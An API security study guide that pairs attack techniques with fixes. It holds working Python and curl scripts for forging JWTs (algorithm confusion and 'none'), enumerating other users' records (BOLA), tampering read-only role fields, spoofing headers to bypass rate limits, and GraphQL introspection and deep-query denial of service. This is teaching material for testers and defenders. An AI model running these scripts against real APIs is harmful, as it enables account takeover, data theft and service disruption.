# API Security Complete Guide

## StudyObjective
Master the core principles, attack techniques, and defense methods of API security

---

## 1. API Security Overview

### 1.1 What is API Security?
API security refers to the technologies and measures that protect Application Programming Interfaces (APIs) from attacks, including:
- Authentication and authorization
- Data protection
- Rate limiting
- Input validation
- Error handling

### 1.2 API Types
1. **REST API**: Most common API architecture
2. **GraphQL API**: Query language API
3. **SOAP API**: Simple Object Access Protocol
4. **gRPC API**: High-performance RPC framework
5. **WebSocket API**: Real-time bidirectional communication

---

## 2. API Authentication Attacks

### 2.1 API Key Leakage

**Vulnerability Scenario**: API key hardcoded in frontend code

**examples**:
```javascript
// Insecure: API key hardcoded
const apiKey = "sk-1234567890abcdef";

fetch("https://api.example.com/data", {
  headers: {
    "Authorization": `Bearer ${apiKey}`
  }
});
```

**Attack Methods**:
```bash
# View frontend source code, extract API Key
curl https://target.com/app.js | grep -i "api.*key"

# Use leaked API Key
curl -H "Authorization: Bearer sk-1234567890abcdef" \
  https://api.example.com/sensitive-data
```

**Fix**
```javascript
// Secure: API key stored in backend
// Frontend only sends requests to its own backend
fetch("/api/data", {
  headers: {
    "Authorization": `Bearer ${sessionToken}`
  }
});
```

---

### 2.2 JWT Attacks

#### Vulnerability 1: Algorithm Confusion Attack

**Attack Methods**:
```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack
Change RS256 to HS256
"""

import jwt
import base64

# Original JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode JWT (without signature verification)
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded: {decoded}")

# Modify payload
decoded['role'] = 'admin'

# Re-sign using public key as HMAC secret (algorithm confusion)
public_key = open('public.pem').read()
new_token = jwt.encode(decoded, public_key, algorithm='HS256')

print(f"Forged token: {new_token}")
```

**Fix**
```python
# Secure JWT verification
import jwt

def verify_jwt(token, public_key):
    """Secure JWT verification"""
    try:
        # Explicitly specify algorithm
        decoded = jwt.decode(
            token,
            public_key,
            algorithms=['RS256'],  # Only allow RS256
            options={
                'verify_exp': True,      # Verify expiration time
                'verify_iat': True,      # Verify issued-at time
                'require': ['exp', 'iat', 'sub']  # Required fields
            }
        )
        return decoded
    except jwt.InvalidAlgorithmError:
        raise ValueError("Invalid algorithm")
    except jwt.ExpiredSignatureError:
        raise ValueError("Token expired")
```

---

#### Vulnerability 2: JWT No Signature Verification

**Attack Methods**:
```python
#!/usr/bin/env python3
"""
JWT No Signature Attack
Change algorithm to none
"""

import base64
import json

def create_unsafe_jwt():
    """Create unsigned JWT"""
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    payload = {
        "sub": "1234567890",
        "name": "Admin",
        "role": "admin",
        "iat": 1516239022
    }
    
    # Base64 encoding
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # No signature
    token = f"{header_b64}.{payload_b64}."
    
    return token

# Use forged token
forged_token = create_unsafe_jwt()
print(f"Forged token: {forged_token}")
```

---

## 3. API Authorization Attacks

### 3.1 BOLA (Broken Object Level Authorization)

**Vulnerability**: IDOR manifested in APIs

**Attack Example**:
```bash
# Normal request
curl -H "Authorization: Bearer user123_token" \
  https://api.example.com/users/123/profile

# Modify ID to access other users' data
curl -H "Authorization: Bearer user123_token" \
  https://api.example.com/users/456/profile
```

**Automated Tool**:
```python
#!/usr/bin/env python3
"""
BOLA Automated Detection Tool
"""

import requests
from concurrent.futures import ThreadPoolExecutor

class BOLAScanner:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}"
        })
    
    def scan_endpoint(self, endpoint, user_id_range):
        """Scan endpoint for BOLA vulnerabilities"""
        for user_id in user_id_range:
            url = f"{self.base_url}{endpoint}/{user_id}"
            
            try:
                r = self.session.get(url, timeout=5)
                
                if r.status_code == 200:
                    print(f"[+] Possible BOLA: {url}")
                    return url
            
            except Exception as e:
                pass
        
        return None

# Usingexamples
scanner = BOLAScanner(
    "https://api.example.com",
    "user123_token"
)

scanner.scan_endpoint("/users", range(1, 100))
```

---

### 3.2 BPLA (Broken Property Level Authorization)

**Vulnerability**: Can modify read-only properties

**Attack Example**:
```bash
# Normal request（can only modify name）
PATCH /api/users/123
{
  "name": "New Name"
}

# Attack request (attempt to modify role)
PATCH /api/users/123
{
  "name": "New Name",
  "role": "admin",      # Read-only property
  "is_verified": true   # Read-only property
}
```

**detection tool**:
```python
#!/usr/bin/env python3
"""
BPLA Automated Detection Tool
"""

import requests
import json

class BPLAScanner:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        })
    
    def test_property_manipulation(self, endpoint, original_data):
        """Test property tampering"""
        # Try adding sensitive properties
        sensitive_properties = [
            "role",
            "is_admin",
            "is_verified",
            "permissions",
            "email_verified"
        ]
        
        for prop in sensitive_properties:
            test_data = original_data.copy()
            test_data[prop] = "admin" if "role" in prop or "admin" in prop else True
            
            r = self.session.patch(
                f"{self.base_url}{endpoint}",
                json=test_data
            )
            
            if r.status_code == 200:
                # Check if modification was successful
                response_data = r.json()
                if prop in response_data:
                    print(f"[+] BPLA found: can modify {prop}")
                    return True
        
        return False

# Usingexamples
scanner = BPLAScanner(
    "https://api.example.com",
    "user_token"
)

scanner.test_property_manipulation(
    "/users/123",
    {"name": "Test User"}
)
```

---

## 4. API Rate Limit Bypass

### 4.1 Common Bypass Techniques

```python
#!/usr/bin/env python3
"""
API Rate Limit Bypass Tool
"""

import requests
from concurrent.futures import ThreadPoolExecutor

class RateLimitBypass:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def bypass_with_headers(self, endpoint):
        """Bypass with HTTP headers"""
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
        ]
        
        for headers in bypass_headers:
            for i in range(100):
                r = self.session.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers
                )
                
                if r.status_code == 200:
                    print(f"[+] Bypass successful: {headers}")
                    return True
        
        return False
    
    def bypass_with_parameter(self, endpoint):
        """Bypass with parameters"""
        for i in range(100):
            r = self.session.get(
                f"{self.base_url}{endpoint}?rate_limit_bypass=1"
            )
            
            if r.status_code == 200:
                print(f"[+] ParametersBypass successful")
                return True
        
        return False

# Usingexamples
bypass = RateLimitBypass("https://api.example.com")
bypass.bypass_with_headers("/api/limited")
```

---

## 5. GraphQL Security

### 5.1 Introspection Query Leakage

**Attack Methods**:
```graphql
# Get GraphQL Schema
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**detection tool**:
```python
#!/usr/bin/env python3
"""
GraphQL Security Detection Tool
"""

import requests
import json

class GraphQLScanner:
    def __init__(self, graphql_url):
        self.graphql_url = graphql_url
        self.session = requests.Session()
    
    def introspection_attack(self):
        """Introspection query attack"""
        query = """
        query IntrospectionQuery {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                }
              }
            }
          }
        }
        """
        
        r = self.session.post(
            self.graphql_url,
            json={"query": query}
        )
        
        if r.status_code == 200:
            schema = r.json()
            print("[+] GraphQL Schema leakage")
            
            # Analyze sensitive types
            for type_info in schema['data']['__schema']['types']:
                if 'User' in type_info['name'] or 'Admin' in type_info['name']:
                    print(f"    Type: {type_info['name']}")
            
            return True
        
        return False
    
    def query_depth_attack(self):
        """Deep query attack (DoS)"""
        query = """
        query {
          user(id: 1) {
            posts {
              comments {
                user {
                  posts {
                    comments {
                      user {
                        id
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        try:
            r = self.session.post(
                self.graphql_url,
                json={"query": query},
                timeout=5
            )
            
            if r.status_code == 200:
                print("[+] Deep query may be unrestricted")
                return True
        
        except requests.Timeout:
            print("[!] Deep query timeout (possible DoS)")
            return True
        
        return False

# Usingexamples
scanner = GraphQLScanner("https://api.example.com/graphql")
scanner.introspection_attack()
scanner.query_depth_attack()
```

---

## 6. API Security Best Practices

### 6.1 Authentication and Authorization
```python
# Secure API authentication middleware
from functools import wraps
from flask import request, jsonify
import jwt

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get('Authorization')
        
        if not token:
            return jsonify({"error": "Missing token"}), 401
        
        try:
            # Verify JWT
            decoded = jwt.decode(
                token.replace('Bearer ', ''),
                SECRET_KEY,
                algorithms=['HS256']
            )
            
            # Check permissions
            if not has_permission(decoded['user_id'], request.endpoint):
                return jsonify({"error": "Forbidden"}), 403
            
            request.user = decoded
        
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        
        return f(*args, **kwargs)
    
    return decorated_function

@app.route('/api/users/<int:user_id>')
@require_auth
def get_user(user_id):
    # Check resource ownership
    if request.user['user_id'] != user_id and not request.user.get('is_admin'):
        return jsonify({"error": "Forbidden"}), 403
    
    user = get_user_from_db(user_id)
    return jsonify(user)
```

### 6.2 Rate Limiting
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/data')
@limiter.limit("100 per hour")  # 100 per hour
def get_data():
    return jsonify({"data": "..."})
```

---

## 7. Learning Checklist

### Theory Mastery
- [x] Understand API security importance
- [x] Master API authentication attacks
- [x] Master API authorization attacks
- [x] Master GraphQL security

### Practical Skills
- [x] JWT attacks
- [x] BOLA/BPLA detection
- [x] Rate limit bypass
- [x] GraphQL security testing

### defense capability
- [x] Secure authentication implementation
- [x] Authorization check mechanisms
- [x] Rate limiting configuration
- [x] Input validation

---

**Documentsversion**: 1.0
**Created**: 2026-03-26 19:11
**Studyduration**: estimated 6-8 hours
**Status**: Completed
